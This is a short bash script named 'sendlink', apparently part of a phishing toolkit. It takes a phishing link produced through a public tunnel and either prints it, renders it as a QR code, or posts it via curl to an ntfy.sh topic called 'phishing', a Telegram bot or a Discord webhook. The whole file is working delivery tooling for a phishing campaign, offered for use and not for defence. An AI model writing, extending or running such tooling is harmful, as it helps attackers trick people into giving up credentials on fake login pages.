#!/bin/bash
# sendlink - Send phishing link via various channels
# This script is called after the public tunnel URL is obtained

link="$1"
method="${2:-echo}"

case "$method" in
	echo|print)
		echo "ðŸ“± Phishing link ready:"
		echo "$link"
		;;
	qr)
		# Generate QR code if available
		if command -v qrencode >/dev/null 2>&1; then
			qrencode -t ANSIUTF8 "$link"
		else
			echo "QR code generation not available"
		fi
		;;
	ntfy)
		# Send via ntfy.sh notification service
		curl -X POST https://ntfy.sh/phishing -d "$link" 2>/dev/null || true
		;;
	telegram)
		# Send via Telegram (requires TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
		if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
			curl -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
				-d "chat_id=${TELEGRAM_CHAT_ID}&text=${link}" 2>/dev/null || true
		fi
		;;
	discord)
		# Send via Discord webhook (requires DISCORD_WEBHOOK_URL)
		if [[ -n "$DISCORD_WEBHOOK_URL" ]]; then
			curl -X POST "$DISCORD_WEBHOOK_URL" \
				-H "Content-Type: application/json" \
				-d "{\"content\":\"ðŸŽ£ Phishing link: $link\"}" 2>/dev/null || true
		fi
		;;
	*)
		echo "Usage: sendlink <link> [method]"
		echo "Methods: echo (default), qr, ntfy, telegram, discord"
		;;
esac
